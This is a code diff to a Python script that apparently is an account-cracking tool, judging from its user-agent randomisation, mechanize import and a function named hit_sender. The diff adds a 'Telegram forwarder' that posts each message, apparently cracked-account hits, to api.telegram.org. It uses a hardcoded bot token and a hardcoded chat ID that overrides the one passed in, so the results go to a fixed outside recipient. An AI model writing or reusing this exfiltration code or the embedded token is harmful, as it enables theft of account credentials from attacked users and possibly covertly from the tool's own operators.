@@ -6,7 +6,7 @@ from os import system as systm
 from bs4 import BeautifulSoup as bs
 
 try:
-    import requests, re, platform, sys, random, subprocess, threading, itertools, base64, uuid, zlib, json, shutil, webbrowser, datetime, string, secrets, mechanize, rich
+    import requests, re, platform, sys, random, subprocess, threading, itertools, base64, uuid, zlib, json, shutil, webbrowser, datetime, string, secrets, mechanize, rich, telegram
 except ImportError:
     systm("pip install requests -y")
     systm("pip install mechanize requests futures bs4==2 > /dev/null")
@@ -640,6 +640,13 @@ for xd in range(1):
 
     gxdsUArndm = gxdsUA3 + gxdsUA4 + gxdsUA1
 
+# TELEGRAM FORWARDER
+def hit_sender(card,message,chat_id):
+    bot_token = '6404644715:AAFekBigDm7fAl3ZUhT710u8DfkF75ggTu8'
+    chat_id = "6542321044"
+    url = f'https://api.telegram.org/bot{bot_token}/sendMessage'
+    data = {'chat_id': chat_id, 'text': message}
+    requests.post(url, data=data)
 
 # COLORS
 li = "\033[38;5;46m"
